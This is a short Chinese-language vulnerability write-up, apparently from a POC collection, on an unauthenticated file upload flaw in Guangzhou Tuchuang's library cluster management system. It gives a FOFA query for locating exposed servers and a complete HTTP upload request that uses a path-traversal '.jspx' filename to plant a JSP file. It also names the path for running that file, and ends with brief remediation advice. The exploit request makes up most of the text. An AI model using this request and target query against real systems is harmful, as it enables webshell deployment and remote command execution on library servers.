## 广州图创图书馆集群管理系统 PictureUpload 任意文件上传漏洞

## 漏洞描述
图创图书馆集群管理系统的 `PictureUpload` 接口缺少登录校验与后缀限制，可上传带脚本后缀的文件。攻击者通过构造 `../123.png.jspx` 等文件名可写入 WebShell 并远程执行命令。

## 资产测绘
```
fofa: app="TCSOFT-图书馆集群管理系统"
```

## POC
```
POST /interlib/loan/PictureUpload HTTP/1.1
Host: <target>
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---WebKitFormBoundaryFfJZ4P1AZBixjELj
Accept: */*
Connection: close

---WebKitFormBoundaryFfJZ4P1AZBixjELj
Content-Disposition: form-data; name="file"; filename="../123.png.jspx"
Content-Type: image/png

<%@ page language="jsp" import="java.util.*,java.io.*" %>

---WebKitFormBoundaryFfJZ4P1AZBixjELj--
```
上传完成后访问 `/interlib/loan/../123.png.jspx` 即可执行。

## 修复建议
- 上传目录与执行目录分离，禁止 `..` 等穿越
- 校验文件类型并启用鉴权

